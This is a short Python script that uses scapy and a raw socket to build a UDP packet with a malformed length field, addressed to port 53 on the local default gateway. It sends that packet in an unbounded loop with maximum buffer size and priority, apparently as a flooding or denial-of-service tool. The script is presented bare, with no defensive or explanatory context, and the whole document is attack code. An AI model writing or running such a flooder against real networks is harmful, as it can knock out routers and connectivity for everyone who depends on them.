from scapy.all import *
import socket
import signal
import sys
import time

def signal_handler(sig, frame):
    global count
    global duration
    print( "Sent " + str(count) + " packets in " + str( time.time() - duration ) + " seconds." )
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

port = int( sys.argv[1] )
my_ip = conf.route.route()[1]
pkt = Ether()/IP(src=my_ip , dst=conf.route.route()[2] )/UDP(sport=53,dport=53)/Raw(bytes(40))
pkt[UDP].len = (len(pkt[Raw].load) + 2)  
pkt = raw(pkt)

sock = socket.socket( socket.AF_PACKET , socket.SOCK_RAW  ) #number for UDP protocol
sock.setsockopt( socket.SOL_SOCKET , socket.SO_SNDBUF , ((2**32)-1).to_bytes( 4 , byteorder="little") )
sock.setsockopt( socket.SOL_SOCKET , socket.SO_PRIORITY , 6 )
sock.bind( ( "wlan0" , 17 ) )


global count
global duration

count = 0
duration = time.time()
while True:
	sock.send( pkt )
	count += 1
